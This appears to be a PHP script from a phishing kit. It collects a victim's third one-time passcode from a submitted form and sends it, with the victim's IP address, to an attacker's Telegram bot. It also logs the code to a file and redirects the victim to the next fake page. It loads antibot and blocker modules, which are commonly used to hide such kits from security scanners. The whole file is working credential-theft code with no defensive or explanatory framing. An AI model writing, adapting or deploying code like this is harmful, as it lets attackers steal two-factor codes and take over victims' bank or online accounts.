<?php 
error_reporting(0);
session_start();
include("../config/antibot.php");
include("../config/antibots.php");
include("../config/antibotsulit.php");
include("../config/blocker.php");
include("../config/bt.php");
include("../config/function.php");
include("../settings/config.php");
$otp3 = ($_POST['otp3']);
$time1 = date('M d - h:i:s A');
$mesg = "[$ip2] - O T P 3 - [$time1]\nO T P 3: $otp3\r\n==========================\n";
antibot($mesg);
$request_params = [
    'chat_id' => $user_id,
    'text' => $mesg
];
$request_url = 'https://api.telegram.org/bot'.$token.'/sendMessage?'.http_build_query($request_params);
file_get_contents($request_url);

$seen = "<font color='#C4FF33' style='font-style:courier;' size='2'>| OTP # 3 : ".$otp3."  |  IP ADDRESS : ".$ip2."</font><br>";
$flogs = fopen("../lib/otp.php","a");
fwrite($flogs, $seen);
fclose($flogs);

header("location: ../otp3.php");
?>